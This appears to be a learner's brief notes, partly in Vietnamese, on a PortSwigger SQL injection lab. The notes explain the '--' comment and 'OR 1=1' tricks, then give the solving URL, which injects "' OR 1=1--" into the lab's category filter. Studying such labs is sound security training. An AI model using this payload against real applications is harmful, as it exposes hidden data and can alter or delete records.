I. Lý thuyết
+ --: dùng để chỉ phần còn lsji của truy vấn đc xem như comment
+ OR 1=1: luôn đúng -> trả về all iterm (nên cận thận vì nó can vô tình update hoặc xóa data
II. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1
To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
https://portswigger.net/academy/labs/launch/d9a071d8264e85184722707ff5747bbbd77963967d1d01f1b22f5dd8252f9767?referrer=%2fweb-security%2fsql-injection%2flab-retrieve-hidden-data
III. Giải
+ truy cập vào 1 mục và nhập: https://0a0400720403c0b380af71de0082002d.web-security-academy.net/filter?category=Accessories%20%27+OR+1=1--
